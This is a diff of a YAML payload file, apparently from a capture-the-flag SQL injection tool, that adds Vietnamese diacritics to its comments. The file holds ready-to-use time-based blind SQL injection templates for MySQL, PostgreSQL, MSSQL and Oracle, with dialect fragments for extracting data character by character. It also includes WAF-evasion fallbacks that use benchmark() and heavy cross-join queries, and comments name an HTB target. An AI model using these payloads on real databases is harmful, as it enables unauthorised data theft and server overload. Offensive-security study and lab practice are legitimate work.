@@ -1,71 +1,71 @@
 # =============================================================================
-# vectors.yaml - kho vector time-based blind cho nhieu DBMS (cau truc 2 tang)
+# vectors.yaml - kho vector time-based blind cho nhiều DBMS (cấu trúc 2 tầng)
 # =============================================================================
 #
-# Moi DBMS la mot block gom:
-#   dialect: cac "manh" cu phap de extract() lap rap cau truy van suy luan
-#   vectors: danh sach vector sleep (template co placeholder)
+# Mỗi DBMS là một block gồm:
+#   dialect: các "mảnh" cú pháp để extract() lắp ráp câu truy vấn suy luận
+#   vectors: danh sách vector sleep (template có placeholder)
 #
 # Placeholder trong template vector:
-#   [INFERENCE]  - cho cam dieu kien. Luc do: 1=1 / 1=2. Luc khai thac: dieu kien binary-search.
-#   [SLEEPTIME]  - so giay sleep (tu --delay)
-#   [RANDNUM]    - so nguyen ngau nhien (tranh cache, dat alias)
-#   [RANDSTR]    - chuoi ngau nhien (dat ten alias subquery)
+#   [INFERENCE]  - chỗ cắm điều kiện. Lúc dò: 1=1 / 1=2. Lúc khai thác: điều kiện binary-search.
+#   [SLEEPTIME]  - số giây sleep (từ --delay)
+#   [RANDNUM]    - số nguyên ngẫu nhiên (tránh cache, đặt alias)
+#   [RANDSTR]    - chuỗi ngẫu nhiên (đặt tên alias subquery)
 #
-# Placeholder trong dialect (extract() dung .format):
-#   {s} - bieu thuc chuoi nguon (vd "(select content from flag)")
-#   {i} - vi tri ky tu (1-based)
-#   {c} - bieu thuc mot ky tu (vd substr(...))
-#   {h} - chuoi hex (cho hex literal)
+# Placeholder trong dialect (extract() dùng .format):
+#   {s} - biểu thức chuỗi nguồn (vd "(select content from flag)")
+#   {i} - vị trí ký tự (1-based)
+#   {c} - biểu thức một ký tự (vd substr(...))
+#   {h} - chuỗi hex (cho hex literal)
 #
-# Thu tu vector trong moi DBMS: uu tien vector KIEM SOAT so lan sleep (subquery-wrapped)
-# truoc, roi sleep tran, roi fallback (benchmark/heavy). Vector dau tien vuot qua xac nhan
-# TRUE/FALSE se duoc chot cho toan bo khai thac.
+# Thứ tự vector trong mỗi DBMS: ưu tiên vector KIỂM SOÁT số lần sleep (subquery-wrapped)
+# trước, rồi sleep trần, rồi fallback (benchmark/heavy). Vector đầu tiên vượt qua xác nhận
+# TRUE/FALSE sẽ được chốt cho toàn bộ khai thác.
 # =============================================================================
 
 mysql:
   dialect:
-    substr:  "substr(({s}),{i},1)"      # lay ky tu thu i
-    ascii:   "ord({c})"                 # ma ky tu
-    length:  "length(({s}))"            # do dai byte
-    charlen: "char_length(({s}))"       # do dai ky tu (phat hien multibyte)
-    hex:     "hex(({s}))"               # hex hoa
-    hexlit:  "0x{h}"                    # hex literal (cho verify khong can nhay)
-    notnull: "(({s}) is not null)"      # kiem tra subquery co du lieu
+    substr:  "substr(({s}),{i},1)"      # lấy ký tự thứ i
+    ascii:   "ord({c})"                 # mã ký tự
+    length:  "length(({s}))"            # độ dài byte
+    charlen: "char_length(({s}))"       # độ dài ký tự (phát hiện multibyte)
+    hex:     "hex(({s}))"               # hex hóa
+    hexlit:  "0x{h}"                    # hex literal (cho verify không cần nháy)
+    notnull: "(({s}) is not null)"      # kiểm tra subquery có dữ liệu
   vectors:
-    # query-SLEEP boc subquery: sleep chi chay 1 lan ke ca trong JOIN (uu tien cao)
+    # query-SLEEP bọc subquery: sleep chỉ chạy 1 lần kể cả trong JOIN (ưu tiên cao)
     - name: mysql-query-sleep
       template: "(select [RANDNUM] from (select(sleep([SLEEPTIME]-if([INFERENCE],0,[SLEEPTIME]))))[RANDSTR])"
-      note: "an toan cho JOIN/ORDER BY - sleep chi chay 1 lan"
-    # inline scalar sleep: pho bien nhat, hop scalar/numeric context (INSERT id)
+      note: "an toàn cho JOIN/ORDER BY - sleep chỉ chạy 1 lần"
+    # inline scalar sleep: phổ biến nhất, hợp scalar/numeric context (INSERT id)
     - name: mysql-inline-sleep
       template: "(if([INFERENCE],sleep([SLEEPTIME]),1))"
-      note: "scalar/numeric context - vector mac dinh target HTB hien tai"
-    # fallback khi sleep() bi filter
+      note: "scalar/numeric context - vector mặc định target HTB hiện tại"
+    # fallback khi sleep() bị filter
     - name: mysql-benchmark
       template: "(if([INFERENCE],benchmark(3000000,md5(1)),1))"
-      note: "khi SLEEP bi WAF chan (hoac MySQL < 5.0.12)"
-    # fallback khi ca sleep lan benchmark bi chan
+      note: "khi SLEEP bị WAF chặn (hoặc MySQL < 5.0.12)"
+    # fallback khi cả sleep lẫn benchmark bị chặn
     - name: mysql-heavy
       template: "(if([INFERENCE],(select count(*) from information_schema.columns a,information_schema.columns b),1))"
-      note: "ep DB lam viec nang - khi khong con ham sleep nao dung duoc"
+      note: "ép DB làm việc nặng - khi không còn hàm sleep nào dùng được"
 
 postgresql:
   dialect:
     substr:  "substr(({s}),{i},1)"
     ascii:   "ascii({c})"
     length:  "length(({s}))"
-    charlen: "length(({s}))"            # pg: length() la theo ky tu
+    charlen: "length(({s}))"            # pg: length() là theo ký tự
     hex:     "encode(convert_to(({s}),'UTF8'),'hex')"
-    hexlit:  "decode('{h}','hex')"      # pg khong co 0x literal
+    hexlit:  "decode('{h}','hex')"      # pg không có 0x literal
     notnull: "(({s}) is not null)"
   vectors:
     - name: pg-sleep-case
       template: "(case when [INFERENCE] then pg_sleep([SLEEPTIME]) else pg_sleep(0) end)"
-      note: "CASE WHEN - pg khong co if() scalar"
+      note: "CASE WHEN - pg không có if() scalar"
     - name: pg-sleep-and
       template: "(select [RANDNUM] where [INFERENCE] and pg_sleep([SLEEPTIME]) is not null)"
-      note: "bien the boc select"
+      note: "biến thể bọc select"
 
 mssql:
   dialect:
@@ -77,13 +77,13 @@ mssql:
     hexlit:  "0x{h}"
     notnull: "(CASE WHEN ({s}) IS NOT NULL THEN 1 ELSE 0 END)=1"
   vectors:
-    # WAITFOR DELAY la STATEMENT, khong phai scalar -> can ngu canh statement/stacked
+    # WAITFOR DELAY là STATEMENT, không phải scalar -> cần ngữ cảnh statement/stacked
     - name: mssql-waitfor
       template: "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'"
-      note: "statement-context - can stacked query, KHONG inline scalar duoc"
+      note: "statement-context - cần stacked query, KHÔNG inline scalar được"
     - name: mssql-waitfor-inline
       template: "(CASE WHEN [INFERENCE] THEN (SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:[SLEEPTIME]') ELSE 1 END)"
-      note: "bien the thu boc subquery (tuy phien ban co the khong hop le)"
+      note: "biến thể thử bọc subquery (tùy phiên bản có thể không hợp lệ)"
 
 oracle:
   dialect:
@@ -92,12 +92,12 @@ oracle:
     length:  "LENGTH(({s}))"
     charlen: "LENGTH(({s}))"
     hex:     "RAWTOHEX(UTL_RAW.CAST_TO_RAW(({s})))"
-    hexlit:  "'{h}'"                    # oracle: so sanh hex nhu chuoi
+    hexlit:  "'{h}'"                    # oracle: so sánh hex như chuỗi
     notnull: "(({s}) is not null)"
   vectors:
     - name: oracle-heavy-case
       template: "(case when [INFERENCE] then (select count(*) from all_objects,all_objects) else 0 end)"
-      note: "heavy query - oracle khong co sleep de dung; dbms_lock.sleep can quyen"
+      note: "heavy query - oracle không có sleep để dùng; dbms_lock.sleep cần quyền"
     - name: oracle-dbms-lock
       template: "(case when [INFERENCE] then dbms_lock.sleep([SLEEPTIME]) else 0 end)"
-      note: "can quyen EXECUTE tren dbms_lock (thuong khong co)"
+      note: "cần quyền EXECUTE trên dbms_lock (thường không có)"
